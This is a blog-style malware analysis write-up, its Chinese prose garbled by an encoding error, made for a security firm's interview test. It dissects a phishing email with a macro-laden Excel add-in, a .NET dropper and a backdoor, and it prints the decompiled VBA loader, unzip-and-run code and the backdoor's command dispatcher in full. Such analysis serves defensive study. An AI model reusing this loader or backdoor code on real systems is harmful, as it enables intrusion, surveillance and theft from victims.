---
title: TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜
tags: [Interview]
category: "Jobï½œInterview"
date: 2024-03-20
---

# TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜
<!-- more -->
:::info
å‰è¨€: é€šå¸¸æˆ‘è‡ªå·±æ‹¿åˆ°ä¸€éš»æ¨£æœ¬ï¼Œèµ·æ‰‹å¼æœƒå…ˆæœä¸€ä¸‹hashï¼ŒVirusTotalå¦‚æœæœ‰ç´€éŒ„çš„è©±æœ€å¥½ï¼Œå†ä¾†æœƒä¸Ÿåˆ°AnyRunçœ‹ä¸€ä¸‹å‹•æ…‹sandboxçš„ç‹€æ…‹ç‚ºä½•ï¼Œä½†ä¸ç¢ºå®šé€™æ¨£çš„æ“ä½œæ˜¯å¦ç¬¦åˆæœ¬æ¬¡ç­†è©¦çš„é æœŸï¼Œæ‰€ä»¥æˆ‘æœƒå…ˆè¨­æ³•åœ¨æœ¬æ©ŸVMå…§åˆ†æçœ‹çœ‹ï¼Œå¦‚æœæœ‰åˆ©ç”¨é€™å¹¾å€‹online toolsè€Œå¾—çŸ¥çš„è³‡è¨Šï¼Œæœƒå†è¡Œæ¨™è¨»
:::
:::danger
ç¶“éäºŒéšé¢è©¦å¾Œï¼Œç”¨ç·šä¸Šçš„å·¥å…·ä¾‹å¦‚VirusTotalå’ŒAnyRunéƒ½æ˜¯è¢«åš´æ ¼ç¦æ­¢çš„ã€‚
ç¬¬ä¸€å€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 2å¤©/ç¬¬äºŒå€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 4å¤©
:::
# æ¨£æœ¬(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a)

## æƒ¡æ„ç¨‹å¼

### æª”æ¡ˆè³‡è¨Š
1. DIE(Detect It Easy)
    ![åœ–ç‰‡](https://hackmd.io/_uploads/S1Lbp6T3p.png)
    çœ‹èµ·ä¾†æ˜¯ä¸€å€‹HTMLçš„ç´”æ–‡å­—æª”æ¡ˆ
2. File/Stat/Exiftool
    å¾ä»¥ä¸‹çµæœä¾†çœ‹ï¼Œæ˜¯ä¸€å€‹SMTPçš„éƒµä»¶æª”æ¡ˆï¼Œä¸¦ä¸”æ˜¯ç´”æ–‡å­—çš„å½¢å¼ï¼Œæ‰€ä»¥ç›´è¦ºä¸Šå¯èƒ½å’ŒOutlookæˆ–æ˜¯Firefox Thunderbirdæœ‰é—œä¿‚ï¼Œä»¥binwalkçš„çµæœä¾†èªªï¼Œä»–æ‡‰è©²æœ‰å£“ç¸®ä¸€äº›å…§å®¹åœ¨å…¶ä¸­ï¼Œå¦‚æœå¯¦éš›ä¸Ÿåˆ°Any.Runçš„è©±æœƒç™¼ç¾çš„ç¢ºæœ‰å¾ˆå¤šæª”æ¡ˆè¢«compressed
    ![åœ–ç‰‡](https://hackmd.io/_uploads/rJfrgyR3a.png)

    æˆ–è€…æ˜¯èªªï¼Œå¾æª”æ¡ˆå…§å®¹ä¾†çœ‹(HxD)ï¼Œæœƒç™¼ç¾dataå¸¶äº†ä¸€å€‹base64çš„fileï¼Œdecodeæœƒç™¼ç¾æ˜¯`0x50 4B 03 04`
    :::spoiler Command Result
    ```bash
    $ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
    93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators
    $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
    ExifTool Version Number         : 12.40
    File Name                       : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
    Directory                       : .
    File Size                       : 180 KiB
    File Modification Date/Time     : 2023:08:14 11:54:39+08:00
    File Access Date/Time           : 2024:02:29 16:55:48+08:00
    File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
    File Permissions                : -rwxrwxrwx
    File Type                       : TXT
    File Type Extension             : txt
    MIME Type                       : text/plain
    MIME Encoding                   : us-ascii
    Newlines                        : Windows CRLF
    Line Count                      : 2410
    Word Count                      : 2741
    $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
      File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
      Size: 184712          Blocks: 368        IO Block: 4096   regular file
    Device: 66h/102d        Inode: 1688849860790082  Links: 1
    Access: (0777/-rwxrwxrwx)  Uid: ( 1000/ sbk6401)   Gid: ( 1000/ sbk6401)
    Access: 2024-02-29 16:55:48.949690200 +0800
    Modify: 2023-08-14 11:54:39.000000000 +0800
    Change: 2024-02-29 16:55:48.949690200 +0800
     Birth: -
    $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
    4244          0x1094          HTML document header
    5554          0x15B2          HTML document footer
    73264         0x11E30         StuffIt Deluxe Segment (data): fWm1
    169908        0x297B4         IMG0 (VxWorks) header, size: 218780743
    ```
    :::

### åŸ·è¡Œæµç¨‹
1. å› ç‚ºé€™æ˜¯ä¸€å€‹SMTPçš„æª”æ¡ˆï¼Œæ‰€ä»¥å…ˆç”¨VMçš„mailçœ‹ä¸€ä¸‹è£¡é¢çš„è³‡è¨Šï¼Œæ²’æ„å¤–çš„è©±æ ¹æ“šä¸Šé¢çš„æ•˜è¿°ï¼Œé€™æ‡‰è©²æ˜¯ä¸€å€‹phishing emailï¼Œä¸¦ä¸”æŠŠå…§æ–‡å½è£æˆå°åº¦çš„MHAæ”¿åºœéƒ¨é–€(Ministry of Home Affairs, å…§æ”¿éƒ¨)
    ![åœ–ç‰‡](https://hackmd.io/_uploads/BkY1yBRna.png)
2. æ‰€ä»¥é‡é»æ‡‰è©²å°±æ˜¯åœ¨ä¿¡ä»¶ä¸­å¤¾å¸¶çš„æª”æ¡ˆï¼Œä¹Ÿå°±æ˜¯==Guidelines.xlam==ï¼Œé€™ä¹Ÿæ˜¯ä¸€å€‹æ²’æœ‰çœ‹éçš„extensionï¼Œæ‰€ä»¥æ ¹æ“š[^xlam]çš„èªªæ˜ï¼Œçœ‹èµ·ä¾†é€™å€‹æª”æ¡ˆå¯ä»¥ä½¿ç”¨å·¨é›†ï¼Œçœ‹åˆ°Macroé€™å€‹é—œéµå­—ç›´è¦ºä¸Šå°±æ„Ÿè¦ºä¸å¤ªå°å‹ï¼Œå› ç‚ºçœ‹éçš„å¯¦éš›æ¡ˆä¾‹å°±è »å¸¸å‡ºç¾åˆ©ç”¨Macroå¤¾å¸¶ä¸€äº›scriptæˆ–æ˜¯æƒ¡æ„çš„command
    > XLAM file extension may refer to a file used by a spreadsheet program called Microsoft Excel. This program enables users to create and edit spreadsheets. These files also contain a macro-enabled add-in that provides extra tools and functionality that may execute macros. XLAM files may also be used for extension of Excel provided modules.
3. ç”±æ–¼VMå…§æ²’æœ‰å¯ä»¥Excelï¼Œæ‰€ä»¥å®¹è¨±æˆ‘ç”¨Any.Run Sandboxçœ‹ä¸€ä¸‹ä¸­é–“åŸ·è¡Œçš„éç¨‹ï¼Œé¦–å…ˆé‡å°å‰ä¸‰å€‹processï¼Œæœ‰å¾ˆå¤§çš„å•é¡Œ
    ![åœ–ç‰‡](https://hackmd.io/_uploads/HkXNuwZT6.png)
    1. Unusual execution from MS Office
        ```bash
        $ C:\Users\admin\Glhvadia\hbraeiwas.exe
        ```
        ä¸æ˜¯å¾ˆæ¸…æ¥šé€™ä¸€å€‹command lineæ˜¯æ€éº¼ä¾†çš„ï¼Œå¾Œä¾†ç™¼ç¾æœ‰ä¸€å€‹VB scriptï¼Œå¾Any.Runä¸­çœ‹ä¸å¤ªå‡ºä¾†ä»–æ˜¯æ€éº¼åŸ·è¡Œçš„ï¼Œæ‰€å¹¸å°±ç›´æ¥åœ¨VMä¸­å®‰è£officeä¾†è·Ÿä¸€ä¸‹
        ![åœ–ç‰‡](https://hackmd.io/_uploads/rylQFw-6a.png)
        
        å…¶å¯¦ä¸€é–‹å§‹åŸ·è¡Œ==Guidelines.xlam==æ™‚æœƒè©¢å•è¦ä¸è¦å•Ÿå‹•Macroï¼Œä¹Ÿå°±æ˜¯é€™å€‹æ™‚å€™å¦‚æœå•Ÿå‹•å°±æœƒåŸ·è¡Œæƒ¡æ„çš„fileâ†’`"C:\Users\admin\Glhvadia\hbraeiwas.exe", vbNormalNoFocus`
    2. Analyze VBA
        ä¸€é–‹å§‹ä¹Ÿä¸çŸ¥é“æ€éº¼åœ¨Excelä¸­çœ‹VBA codeï¼Œä¹Ÿæ˜¯æ ¹æ“š[^vba][^vba-excel]æ‰çŸ¥é“ï¼Œå¦å¤–ï¼Œç”±æ–¼æ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°é—œæ–¼VBAçš„å•é¡Œï¼Œæ‰€ä»¥æœ‰é—œæ–¼è¦å¾å“ªä¸€å€‹Moduleé–‹å§‹çœ‹ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä¸éé‚„å¥½ä»–åªæœ‰å…©å€‹Moduleï¼Œé›–ç„¶æˆ‘çœ‹ä¸æ˜¯å¾ˆç¢ºå®šVBAçš„æµç¨‹ï¼Œä½†æ ¹æ“šAIçš„è§£æå¯ä»¥ç•¥çŸ¥ä¸€äºŒ
        ![åœ–ç‰‡](https://hackmd.io/_uploads/HJa3-Kb6T.png)
        ```vb
        Sub userothraLoadr()
            Dim path_othra_file As String
            Dim file_othra_name  As String
            Dim fldr_othra_name  As Variant
            Dim byt() As Byte
            Dim ar1othra() As String


            file_othra_name = "hbraeiwas"
            fldr_othra_name = Environ$("USERPROFILE") & "\Glhvadia\"

            If Dir(fldr_othra_name, vbDirectory) = "" Then
                MkDir (fldr_othra_name)
            End If
            path_othra_file = fldr_othra_name & file_othra_name & ".e"
            If InStr(Application.OperatingSystem, "6.02") > 0 Or InStr(Application.OperatingSystem, "6.03") > 0 Then
                ar1othra = Split(UserForm1.TextBox2.Text, "i")
            Else
                ar1othra = Split(UserForm1.TextBox1.Text, "i")
            End If
            Dim btsothra() As Byte
            Dim linothra As Double
            linothra = 0
            For Each vl In ar1othra
                ReDim Preserve btsothra(linothra)
                btsothra(linothra) = CByte(vl)
                linothra = linothra + 1
            Next
            Open path_othra_file & "xe" For Binary Access Write As #3
                 Put #3, , btsothra
            Close #3
             Shell path_othra_file & "xe", vbNormalNoFocus
        End Sub
        ```
        é€™å€‹scriptç°¡å–®ä¾†èªªå°±æ˜¯åœ¨åšmalware payloadçš„extractï¼ŒåŸæœ¬ä½œè€…æŠŠæƒ¡æ„çš„payload scrambleä¹‹å¾Œï¼Œç•¶victimåŒæ„å•Ÿå‹•Macroï¼Œä»–æœƒå†unscrambleï¼Œå¯ä»¥çœ‹åˆ°ä¸‹åœ–ï¼Œä»–æœƒä¾ç…§ä¸åŒçš„Application Versionï¼Œé¸æ“‡è¦ç”¨å“ªä¸€å€‹scramble payloadæ¥è‘—æŠŠé€™äº›bitsè½‰æˆbyteså¾Œå¯«åˆ°æŸä¸€å€‹æª”æ¡ˆä¸­ï¼Œä¸¦ä¸”ç”¨shellåŸ·è¡Œè©²æª”æ¡ˆï¼Œä»¥ä¸Šé€™äº›æ“ä½œéƒ½æ¥µå…¶è©­ç•°ï¼Œå¦å¤–ä»–æŠŠæª”æ¡ˆå¯«åœ¨
        ```vb
        Environ$("USERPROFILE") & "\Glhvadia\hbraeiwas"
        ```
        :::danger
        é€™ä¸€æ®µæ˜¯éŒ¯çš„ï¼Œä»–çœ‹çš„ç‰ˆæœ¬æ˜¯OSçš„ç‰ˆæœ¬è™Ÿï¼Œä¾†æ±ºå®šè¦ç”¨å“ªä¸€éš»Payloadï¼Œå› ç‚ºé€™å’Œå¾Œé¢.NETçš„ç‰ˆå¾ˆä¹Ÿæœ‰é—œä¿‚
        :::
        ![image](https://hackmd.io/_uploads/r1H_RTzp6.png)
        å¯¦éš›å»çœ‹ä¹Ÿçš„ç¢ºæ˜¯åœ¨é€™é‚Š
        ![image](https://hackmd.io/_uploads/H1RAlCza6.png)
    3. Anaylize hbraeiwas.exe
        æ ¹æ“šDIEçš„è§£æï¼Œé€™æ˜¯ä¸€å€‹ç”¨.NETå¯«çš„scriptï¼Œæˆ‘ä¹‹å‰ç¢°åˆ°.NETçš„ä¾‹å­ä¸å¤šï¼Œå”¯ä¸€æœ‰ç¢°éçš„reverseç¶“é©—æ˜¯ä¾†è‡ª[è‡ºå¤§è¨ˆå®‰çš„welcomeé¡Œ-Nine & Nine-Revenge](https://hackmd.io/@SBK6401/HkIYEw8Kh)
        ![image](https://hackmd.io/_uploads/HkBm8RfTT.png)
        ä¸€é–‹å§‹ä¸¦ä¸çŸ¥é“è¦å…ˆçœ‹å“ªè£¡ï¼Œæ‰€ä»¥çœ‹äº†ä¸€äº›`.NET` reversingçš„æ–‡ç« ï¼Œç™¼ç¾å¯ä»¥å…ˆå¾è‡ªå®šç¾©çš„moduleé–‹å§‹çœ‹ï¼Œä¹Ÿå°±æ˜¯`hbraeiwas`é€™å€‹classï¼Œå¦‚ä¸‹åœ–
        ![image](https://hackmd.io/_uploads/H1M0HJQpp.png)
        é€écopilotçš„è§£æå¯ä»¥å¾ˆæ–¹ä¾¿çš„çœ‹å‡ºé€™å€‹ç¨‹å¼çš„ä¸»è¦åŠŸèƒ½æ˜¯è§£å£“ç¸®ä¸€å€‹ ZIP æª”æ¡ˆä¸¦å•Ÿå‹•å…¶ä¸­åŒ…å«çš„æ‡‰ç”¨ç¨‹å¼ã€‚é€™ç¨®è¡Œç‚ºå¸¸è¦‹æ–¼ä¸€äº›æƒ¡æ„è»Ÿé«”ä¸­ï¼Œå› ç‚ºå®ƒå¯ä»¥ç”¨æ–¼è‡ªè§£å£“ç¸®ä¸¦åŸ·è¡Œæƒ¡æ„ç¨‹å¼ç¢¼ï¼Œå¦‚æœç›´æ¥ç”¨å‹•æ…‹debuggerï¼Œå°±æœƒæ›´æ¸…æ¥šä»–æŠŠæ±è¥¿unzipåˆ°å“ªé‚Šå»ï¼Œä»–æ˜¯decompressåˆ°`C:\ProgramData\Hdlharas\dlrarhsiva.exe`ï¼Œä¸¦ä¸”å¯¦éš›åŸ·è¡Œ
        ![image](https://hackmd.io/_uploads/HkWmWeXTa.png)
        å†è©³ç´°èªªæ˜ä¸€ä¸‹ï¼Œä»–å…ˆinstantiate Class1ï¼Œä¸¦ä¸”æŠŠè£¡é¢çš„å…§å®¹ä¸Ÿåˆ°`dlrarhsiva.exe`ï¼Œå†åŸ·è¡Œï¼Œæ‰€ä»¥å¦‚æœä¸æƒ³è¦åˆ†æå…¶ä»–æœ‰çš„æ²’å¾—æ±è¥¿ï¼Œå¯ä»¥ç›´æ¥çœ‹`Resources\dlrarhsiva7`é€™å€‹åŸ·è¡Œæª”
        ![image](https://hackmd.io/_uploads/HyMWUxmaa.png)
        :::spoiler
        ```csharp
        public void UnZip()
        {
            try
            {
                string apppath = this.get_apppath();
                Class1 @class = new Class1();
                byte[] wind = @class.getWind();
                bool flag = !Directory.Exists(apppath);
                if (flag)
                {
                    Directory.CreateDirectory(apppath);
                }
                string text = apppath + this.appName;
                File.WriteAllBytes(text, wind);
                string text2 = apppath + "mdkhm.zip";
                flag = !File.Exists(text2);
                if (flag)
                {
                    File.Move(text, text2);
                }
                string text3 = text + ".exe".ToString();
                flag = !File.Exists(text3);
                if (flag)
                {
                    object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(this.shObj, null, "NameSpace", new object[]
                    {
                        apppath
                    }, null, null, null));
                    object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(this.shObj, null, "NameSpace", new object[]
                    {
                        text2
                    }, null, null, null));
                    NewLateBinding.LateCall(objectValue, null, "CopyHere", new object[]
                    {
                        RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, null, "Items", new object[0], null, null, null)),
                        4
                    }, null, null, null, true);
                }
                Process.Start(text3);
            }
            catch (Exception ex)
            {
            }
        }
        ```
        :::
    4. Anaylize dlrarhsiva.exe
        æ ¹æ“šDIEç™¼ç¾é€™ä¹Ÿæ˜¯ä¸€å€‹.NETå¯«çš„PE file
        ![image](https://hackmd.io/_uploads/S1mWzgXpa.png)
        è€Œä¸”æœƒç™¼ç¾moduleå¤šäº†å¾ˆå¤šï¼Œå¯¦éš›é€²å»çœ‹æœƒç™¼ç¾æ‡‰è©²æ˜¯å¯¦éš›èˆ‡C2 serveré€£ç·šå’Œå¯¦ä½œæŒ‡ä»¤çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯å¾Œé–€çš„æŒ‡ä»¤éƒ½åœ¨é€™é‚Š
        ![image](https://hackmd.io/_uploads/BJ1jV-mTT.png)
        è‡³æ–¼æœ‰å“ªä¸€äº›æ“ä½œï¼Œè©³ç´°å¯ä»¥çœ‹å¾Œé–€åŠŸèƒ½çš„section
            
                
### é€šè¨Šå”å®š
æˆ‘æ˜¯ç›´æ¥æŠŠany.runçš„pcap downloadä¸‹ä¾†çœ‹æœ‰å“ªäº›æ±è¥¿
```
NBNS
ARP
ICMPv6
LLMNR
BROWSER
DNS
TCP
DHCPv6
MDNS
STP
```
å…¶å¯¦æœ€ä¸»è¦C2 serverå’Œvictimçš„é€£ç·šä¸»è¦æ˜¯TCPï¼Œä¸éå› ç‚ºC2 serverè²Œä¼¼æ²’æœ‰åœ¨é‹ä½œäº†ï¼Œæ‰€ä»¥æ²’è¾¦æ³•é€£ç·šï¼Œæˆ‘åªèƒ½å¤§æ¦‚ç”¨é€£ç·šå¤±æ•—çš„å°åŒ…ä»¥åŠå¾Œé–€çš„codeåˆ¤æ–·ï¼Œè‡³ç”±æœ‰æ²’æœ‰å…¶ä»–çš„é€£ç·šæ–¹å¼å°±ä¸æ˜¯å¾ˆç¢ºå®š
![image](https://hackmd.io/_uploads/HJlaEEQTa.png)


### åŠ è§£å¯†æ¼”ç®—æ³•
å°±æˆ‘æœ¬èº«çš„ç†è§£ï¼Œçœ‹ä¸å¤ªå‡ºä¾†å“ªé‚Šæœ‰ç‰¹åˆ¥åšåˆ°åŠ è§£å¯†çš„äº‹æƒ…ï¼Œæ¯ä¸€å€‹æ­¥é©Ÿå¹¾ä¹éƒ½åªæ˜¯ä¸€èˆ¬çš„unscrambleæˆ–æ˜¯decompresså¯ä»¥è§£é‡‹çš„åœ°æ–¹

### å¾Œé–€åŠŸèƒ½
1. Screenshotâ†’
                `dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/SLCLRNS/dlrarhsivascreen`
    ![image](https://hackmd.io/_uploads/HyBqS-XTp.png)
2. Remove Userâ†’`dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/OLRDMR/dlrarhsivaremove_user`
    é€™ä¸€æ®µæˆ‘èªç‚ºæ˜¯æƒ³è¾¦æ³•æŠŠä¸€äº›è³‡æ–™pullä¸‹ä¾†å¾Œï¼Œä¸¦ä¸”ç›´æ¥åŸ·è¡Œremove userçš„å‹•ä½œï¼Œæ‰€ä»¥å¯¦éš›è·Ÿé€²å»==dlrarhsivapull_data==é€™å€‹methodï¼Œæœƒç™¼ç¾çš„ç¢ºå¦‚æˆ‘æ‰€é æ¸¬ï¼Œåªä¸éå¯¦ä½œçš„æ–¹æ³•æ˜¯ä»–å…ˆå¾serveré‚£ä¸€ç«¯çœ‹æœ‰å¤šå°‘çš„byteséœ€è¦pullï¼Œç„¶å¾ŒæŠŠè©²å€¼è½‰æˆintå¾Œå°±ç›´æ¥pullè³‡æ–™
    :::spoiler dlrarhsivapull_data() Source Code
    ```csharp
    // dlrarhsiva.OLRDMR
    // Token: 0x06000036 RID: 54 RVA: 0x0000480C File Offset: 0x00002A0C
    public void dlrarhsivaremove_user()
    {
        try
        {
            byte[] array = this.server.dlrarhsivapull_data();
            if (array != null)
            {
                if (!File.Exists(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + ".exe"))
                {
                    File.WriteAllBytes(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + ".exe", array);
                    this.dlrarhsivado_process(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + ".exe");
                }
            }
        }
        catch
        {
        }
    }
    ```
    :::
3. Fetch Victim's Infoâ†’`dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/MLRLEINF/dlrarhsivaInfo`
    å¾ä»¥ä¸‹source codeå¯ä»¥çŸ¥é“ä½¿ç”¨Infoé€™å€‹commandå¯ä»¥å¾—çŸ¥victimçš„Usernameæˆ–æ˜¯MachineName
    :::spoiler dlrarhsivaInfo() Source Code
    ```csharp
    // dlrarhsiva.MLRLEINF
    // Token: 0x06000031 RID: 49 RVA: 0x0000472C File Offset: 0x0000292C
    private void dlrarhsivaInfo()
    {
        this.dlrarhsivaapver = "M.0.0.5|dlrarhsiva".Split(new char[]
        {
            '|'
        })[0];
        this.dlrarhsivacname = Environment.MachineName;
        this.dlrarhsivauname = Environment.UserName;
        this.dlrarhsivauip = "";
        this.dlrarhsivalancard = "";
    }
    ```
    :::
4. Others
    ç”±æ–¼æ”»æ“Šè€…å¯ä»¥ä½¿ç”¨çš„commandå¯¦åœ¨æ˜¯å¤ªå¤šäº†ï¼Œæ‰€ä»¥å°±ç›´æ¥åˆ—å‡ºä¾†çœ‹æ¯”è¼ƒæ¸…æ¥š
    ![image](https://hackmd.io/_uploads/Hyb8sb766.png)
    æ¯”è¼ƒé‡è¦çš„æ˜¯get_commandé€™å€‹methodï¼Œé€™å€‹å°±å’Œå‰é¢æåˆ°çš„pull dataé‚£å€‹å·®ä¸å¤šï¼Œåªæ˜¯ä»–å¾Œé¢é‚„æœƒå¸¶ä¸Šcommandå’Œargumentï¼Œä¾¿æ–¼ä¸‹ä¸€äº›æŒ‡ä»¤

    å¦å¤–ï¼Œ`dlrarhsivaimage_info()`é€™å€‹methodä¸»è¦æ˜¯çœ‹æŒ‡å®šçš„åœ–ç‰‡çš„ä¸€äº›ç›¸é—œè³‡è¨Šä¸¦ä¸”æŠŠè©²æª”æ¡ˆä¸Šå‚³åˆ°æŸå€‹åœ°æ–¹ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œé‚„å¯ä»¥åšåˆ°åˆªé™¤æª”æ¡ˆã€ä¸Šå‚³æª”æ¡ˆã€å„²å­˜æª”æ¡ˆã€æŸ¥çœ‹userè³‡è¨Šç­‰ç­‰ï¼Œæ‰€æœ‰çš„commandå¯ä»¥æŸ¥çœ‹`dlrarhsivasee_responce()`é€™å€‹methodï¼Œè£¡é¢æœ‰ç´€éŒ„æ‰€æœ‰é‡åˆ°ä¸åŒçš„commandæœƒåŸ·è¡Œå°æ‡‰çš„method(å…±æœ‰25å€‹ï¼Œè©³ç´°source codeå¦‚ä¸‹)
    :::spoiler
    ```csharp
    // dlrarhsiva.MLREDM
    // Token: 0x06000018 RID: 24 RVA: 0x00002EB8 File Offset: 0x000010B8
    private void dlrarhsivasee_responce()
    {
        if (!this.dlrarhsivaiswitch)
        {
            this.dlrarhsivaiswitch = true;
            this.dlrarhsivanetStream = this.dlrarhsivaCMD.dlrarhsivaNS(this.dlrarhsivatcpsck);
            this.dlrarhsivacapScreen = false;
            while (this.dlrarhsivais_working)
            {
                MLREDM.<>c__DisplayClasse CS$<>8__locals1 = new MLREDM.<>c__DisplayClasse();
                CS$<>8__locals1.<>4__this = this;
                CS$<>8__locals1.switchType = this.dlrarhsivaget_command();
                if (CS$<>8__locals1.switchType == null)
                {
                    this.dlrarhsivais_working = false;
                    break;
                }
                this.dlrarhsivareqCnls = false;
                string text = CS$<>8__locals1.switchType[0].ToLower();
                if (text.Split(new char[]
                {
                    '-'
                }).Length > 1)
                {
                    text = "dlrarhsiva-" + text.Split(new char[]
                    {
                        '-'
                    })[1];
                }
                else
                {
                    text = "dlrarhsiva-" + text;
                }
                string text2 = text;
                switch (text2)
                {
                case "dlrarhsiva-procl":
                    this.dlrarhsivafunStarter = delegate()
                    {
                        this.dlrarhsivalist_processes("procl");
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                    break;
                case "dlrarhsiva-getavs":
                    this.dlrarhsivafunStarter = delegate()
                    {
                        this.dlrarhsivalist_processes("getavs");
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                    break;
                case "dlrarhsiva-thumb":
                    this.dlrarhsivaimage_info(CS$<>8__locals1.switchType[1]);
                    break;
                case "dlrarhsiva-putsrt":
                    this.dlrarhsivaload_app();
                    break;
                case "dlrarhsiva-filsz":
                    this.dlrarhsivafile_info(CS$<>8__locals1.switchType[1], false);
                    break;
                case "dlrarhsiva-rupth":
                    this.dlrarhsivapush_data(null, "dlrarhsiva-appth=|dlrarhsiva".Split(new char[]
                    {
                        '|'
                    })[0] + DLAONIF.dlrarhsivaget_mpath(), false);
                    break;
                case "dlrarhsiva-dowf":
                    this.dlrarhsivasaveFile(CS$<>8__locals1.switchType[1]);
                    break;
                case "dlrarhsiva-endpo":
                    try
                    {
                        Process.GetProcessById((int)Convert.ToInt16(CS$<>8__locals1.switchType[1].Trim())).Kill();
                    }
                    catch
                    {
                    }
                    break;
                case "dlrarhsiva-scrsz":
                    this.dlrarhsivascreenSize(CS$<>8__locals1.switchType[1]);
                    break;
                case "dlrarhsiva-cscreen":
                    this.dlrarhsivasee_scren(CS$<>8__locals1.switchType[1]);
                    break;
                case "dlrarhsiva-dirs":
                    this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivalistDrives));
                    this.dlrarhsivafunThread.Start();
                    break;
                case "dlrarhsiva-stops":
                    this.dlrarhsivacapScreen = false;
                    break;
                case "dlrarhsiva-scren":
                    this.dlrarhsivacapScreen = true;
                    this.dlrarhsivafunStarter = delegate()
                    {
                        CS$<>8__locals1.<>4__this.dlrarhsivais_screen(CS$<>8__locals1.switchType[1]);
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                    break;
                case "dlrarhsiva-cnls":
                    this.dlrarhsivaautCnls = true;
                    this.dlrarhsivareqCnls = true;
                    this.dlrarhsivacapScreen = false;
                    break;
                case "dlrarhsiva-udlt":
                    this.dlrarhsivaCMD.dlrarhsivaremove_user();
                    break;
                case "dlrarhsiva-delt":
                    this.dlrarhsivaremove_file(CS$<>8__locals1.switchType[1]);
                    break;
                case "dlrarhsiva-afile":
                    this.dlrarhsivafunStarter = delegate()
                    {
                        CS$<>8__locals1.<>4__this.dlrarhsivasend_auto(CS$<>8__locals1.switchType[1]);
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                    break;
                case "dlrarhsiva-listf":
                    this.dlrarhsivafunStarter = delegate()
                    {
                        CS$<>8__locals1.<>4__this.dlrarhsivaHD.dlrarhsivalookFiles(CS$<>8__locals1.switchType[1]);
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                    break;
                case "dlrarhsiva-file":
                    this.dlrarhsivafunStarter = delegate()
                    {
                        CS$<>8__locals1.<>4__this.dlrarhsivapush_file(CS$<>8__locals1.switchType[1]);
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                    break;
                case "dlrarhsiva-info":
                    this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivauser_info));
                    this.dlrarhsivafunThread.Start();
                    break;
                case "dlrarhsiva-runf":
                    this.dlrarhsivaCMD.dlrarhsivado_process(CS$<>8__locals1.switchType[1].Split(new char[]
                    {
                        '>'
                    })[0]);
                    break;
                case "dlrarhsiva-fles":
                {
                    string files = this.dlrarhsivaHD.dlrarhsivalookupFiles(CS$<>8__locals1.switchType[1]);
                    if (files != null)
                    {
                        this.dlrarhsivafunStarter = delegate()
                        {
                            CS$<>8__locals1.<>4__this.dlrarhsivapush_data(null, "dlrarhsiva-fles=|dlrarhsiva".Split(new char[]
                            {
                                '|'
                            })[0] + files, false);
                        };
                        this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                        this.dlrarhsivafunThread.Start();
                    }
                    break;
                }
                case "dlrarhsiva-dowr":
                    this.dlrarhsivasaveFile(CS$<>8__locals1.switchType[1]);
                    break;
                case "dlrarhsiva-fldr":
                {
                    string Folders = this.dlrarhsivaHD.dlrarhsivacheckFolders(CS$<>8__locals1.switchType[1]);
                    if (Folders != null)
                    {
                        this.dlrarhsivafunStarter = delegate()
                        {
                            CS$<>8__locals1.<>4__this.dlrarhsivapush_data(null, "dlrarhsiva-fldr=|dlrarhsiva".Split(new char[]
                            {
                                '|'
                            })[0] + Folders, false);
                        };
                        this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                        this.dlrarhsivafunThread.Start();
                    }
                    break;
                }
                }
            }
            this.dlrarhsivais_working = false;
            this.dlrarhsivacapScreen = false;
        }
        this.dlrarhsivaiswitch = false;
    }
    ```
    :::

### å¸¸é§æ–¹å¼
